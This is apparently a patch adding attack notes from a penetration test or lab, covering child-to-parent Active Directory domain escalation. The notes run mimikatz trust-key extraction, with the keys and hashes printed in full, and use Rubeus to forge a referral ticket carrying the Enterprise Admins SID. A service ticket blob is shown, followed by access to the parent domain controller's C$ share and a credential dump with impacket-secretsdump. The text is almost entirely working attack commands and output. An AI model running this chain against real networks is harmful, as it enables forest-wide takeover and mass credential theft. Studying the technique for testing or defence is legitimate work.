@@ -1,0 +1,37 @@
+# Trust key
+mimikatz # lsadump::trust /patch
+
+Current domain: INTERNAL.ZSM.LOCAL (internal / S-1-5-21-3056178012-3972705859-491075245)
+
+Domain: ZSM.LOCAL (ZSM / S-1-5-21-2734290894-461713716-141835440)
+ [  In ] INTERNAL.ZSM.LOCAL -> ZSM.LOCAL
+    * 04/11/2023 03:20:59 - CLEAR   - a6 31 6e 5a cc 5b 7d 31 ac c3 de 5e df 53 ad 6f a5 e8 14 ca 60 92 cd 8a bf 35 99 c1 81 6e 3c 3f 20 b8 de 12 cb 74 c4 ad 88 f2 4a 87 32 1e 6e 31 15 15 f3 ce 4c dc a4 3e 71 0a b2 3f 9e c9 e2 70 1e f8 d5 f7 a7 39 76 d8 b2 7f 21 0d c1 81 22 38 c3 2a 71 3e 62 b2 66 1a 43 76 98 c3 73 35 8d 03 b5 86 e4 03 d4 81 a7 25 77 95 7e 9d 6f 67 e7 09 32 21 db 6b 0a 5d db db 8a 4d 73 c0 78 69 97 a5 71 b9 8f 1b cf 91 ed 84 ee 35 13 7f d3 d9 95 46 8f 78 19 1c 47 41 33 e3 32 9f 3b 6a c6 9c 16 b1 1e 3e cc 23 d2 d6 56 b5 55 4b 5f f6 73 c4 e7 af b4 e7 05 79 32 c2 ae ac dc 84 3f fb c2 2c d6 32 20 3b ee fd 0f 27 df 65 49 3c 78 5b df 26 55 5f ff 5d 06 60 d1 b1 e6 c9 84 9e 2b 4c 29 48 d6 b2 16 44 fc a5 3f 82 61 e8 9f 9f 
+2c 64 e3 ab 23 ba 
+        * aes256_hmac       97ad22720d1e20f603035bae4854499847d3c05ea711f8f85a7c2258cd107fbc
+        * aes128_hmac       6c6d970e3d7557ee57dc0cdc6634f5f3
+        * rc4_hmac_nt       1f79f1f47ff3b3f0e2c64627098c2a2a
+
+ [ Out ] ZSM.LOCAL -> INTERNAL.ZSM.LOCAL
+    * 04/11/2023 03:20:50 - CLEAR   - 51 66 e1 13 5a 6a 12 51 ef 04 ca ac 47 c5 0d 42 ce d4 c5 06 39 2e 67 9c 37 9c 11 37 80 c4 8c 86 63 8e 37 ac 31 7e ba 0a b2 b1 8f 36 5a 5f cb f0 c4 cc af 77 38 69 63 bc a4 ab be 5e 3c 3d e6 d9 f7 63 e9 04 54 e2 3d 37 e0 55 10 8a 15 52 27 e8 88 b2 da 83 ce b8 3b f9 03 c5 ec 89 5e ea 28 a0 37 07 d0 e1 97 da be b7 b0 cd 98 7e b3 66 4d 62 6c 46 fa 62 3d 94 f3 ec e8 c7 29 d6 98 16 1f 0a ca 0b b4 f9 c7 c8 2c 99 1f 74 3c 5a 40 a5 bd 73 a7 86 ff 2d 0b 2c b5 ea bc 55 99 c5 f6 b5 51 21 28 ad 8b 2c d4 c2 f5 49 d1 88 44 b9 81 0e f2 d0 52 43 6c 24 09 76 51 80 dc d9 f1 97 f6 c8 7b 3a 37 82 70 20 97 eb c2 2c 9e aa 88 0f 4a 6b 1e 50 68 8a 5b f2 f2 f0 e4 a9 24 7f 50 14 68 a5 af 2e 21 89 0e 01 3d 99 93 e6 37 ff 
+01 01 ff 49 2e 6a 
+        * aes256_hmac       54034ccc9d35f23e1a671ec8c6b8e66625b78d469279d54124e3c01ef9ff8611
+        * aes128_hmac       555ba9ffa974dd87f8833ac0adbaa9cb
+        * rc4_hmac_nt       2523964b918ca975d4210be7255a7f15
+
+# Forge a referral TGT for Administrator for the parent domain zsm.local and include the SID of the Enterprise Admins group:
+Rubeus.exe silver /user:Administrator /domain:internal.zsm.local /service:krbtgt/zsm.local /rc4:1f79f1f47ff3b3f0e2c64627098c2a2a /sid:S-1-5-21-3056178012-3972705859-491075245 /sids:S-1-5-21-2734290894-461713716-141835440-519 /ptt /nowrap
+
+# Get TGS for CIFS and save it to file
+Rubeus.exe asktgs /service:CIFS/zph-svrdc01.zsm.local /dc:zph-svrdc01.zsm.local /outfile:cifs.txt /nowrap /ptt /ticket:doIF1TCCBdGgAwIBBaEDAgEWooIEyTCCBMVhggTBMIIEvaADAgEFoRQbEklOVEVSTkFMLlpTTS5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJenNtLmxvY2Fso4IEfjCCBHqgAwIBF6EDAgEDooIEbASCBGhc73URj2/ZSWhsoPkZam9muK6NVzAD/dtvcjXl7B8i62nv6iZVlXkxA05JI7p4IbjRRhBa1U0LtRut71Ep3g+vmkDrBh5WCrMS+woXsZTJzjjHQotgOWW70yCCIExVBzsjnACc5D6wILuRc7myy3wPgnadU44LvyD62I9zQLriTEgFH5zfKDlSBxCI8+WaBxVfckDZaWTjaEGtjPbCnc+7WWNuNEQi33ZMRJnf2MNl0mPqECIVoftur9fGUqAHESwXk6UQOD2RetIIzMri1/i2sC5WQ2YWewJwq+mFpipIVRz3oWUMwUmJu+h56UW62b1cphQ9aXuITgW56zxCKi8Dnki69O8HbvLDqw+pS3r4t/Nr3aGgVz214Qbgi8k4/iYiFPNYgoEj8LAQ4VMkvMuhi3j+4B9uW976Oz3lPUyNujx1oXt29rYsWyo/Blbh3dB4gxW/G/RM4lae4nGrH1h5Le4zzQbQckR3tyDWT3Bu9gUbzh8pVxeTd23p2wuKD+5V/uYhq6nKriHFAD5OfEijQT5zkByx7eFszlIPOxKUQ4Da+Ow0ElZ+tmUHvJv5K52XuxZOMK9OwPIJqfBYwFuForA3iGdOAWJMzYGPZrVl7Nz7LFGlAzddb54Zponh4DlgWCgZjJttuaJ8dB2JmIQueFGwQF6MpBnMxcgG89fxKowpsrJuZUC8G64a6E5gozUuhUL12z1jiqbYHDLzS375+e8bqhdoO8Dm3+Dm1l1dRk1yc/W1+ttATpQLQwgXFI7qvjZBqbB1Ozu2cBqlkrQ5vIhXxSKcxqrQhsw668JwdGVY70Y850hVGuJnu63pkRj3dn9xn164byjwZzb0PaNbcWm47cpaGS9aooj+8htE2GIWddnFWh2tsLhrOE/lDNrqSl0wmfGl3Vbdn46NRBzpH8+DnHccfUgHo4R4/eurGKaPa3U8V0JVROix+02FF2cLEl5BLO8H5n+N1Tqps1muZYTOwx+MbpwBuBTHFS0zmNF7NXZhOh+7SR2wAH8bRzvAMRKILoHiwOcjX/K3Taar3qOxbfDGySp73CUejj8RWynNsJdZSDAPP8MPwqVRWbv96LbV+eGnhOZLdy/XN1uEh9kevY66g8e/Nyif/exjoaFsqzcGlbqGZjMxNrN1tvtcs7oGpPyA5HCijLZO74+NsfjSwNFtOltSKGxG3iq/oBj59Ejq+5TFZ062G5Mn2sjfR3rE22bBAXBihUsjsc7hMYcrfAqEhH7Odqmo1hChmlnkSEcFhSSBrQLMPiS+R2mJFFQUNAyD0E6nbQSyAuf0hXWxkrgeX7gIWFo9Q9+ulvmRPFF7YJv4uKl494vfO+kZlxQBYs69YgbcftL4xDRPjQIZT9v7AzDe4lQYzGndTzPATDUYHY5aoZ3H1045b0uYwEu/1zT3L+OadpQ0YUw0+gb9k45JAomsUDSDVKZQjApBPuGnMKAyuOSatZwwqY8uxJWJ6/MZq3GeDSawgJmEt0Nb9nUUW/GjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAbMBmgAwIBF6ESBBCY9Ji/4jMej/b+/Y4wXtsDoRQbEklOVEVSTkFMLlpTTS5MT0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAECgAACkERgPMjAyMzExMDQxMTA5MDNapREYDzIwMjMxMTA0MTEwOTAzWqYRGA8yMDIzMTEwNDIxMDkwM1qnERgPMjAyMzExMTExMTA5MDNaqBQbEklOVEVSTkFMLlpTTS5MT0NBTKkeMBygAwIBAqEVMBMbBmtyYnRndBsJenNtLmxvY2Fs
+
+# List parent DC directory
+dir \\zph-svrdc01.zsm.local\C$
+
+# Convert from kirbi to ccache
+impacket-ticketConverter cifs.kirbi cifs.ccache
+
+# export ccache to KRB5CCNAME env variable
+export KRB5CCNAME=cifs.ccache
+
+# secretsdump via kerberos authentication
+impacket-secretsdump -debug zph-svrdc01.zsm.local -k -no-pass
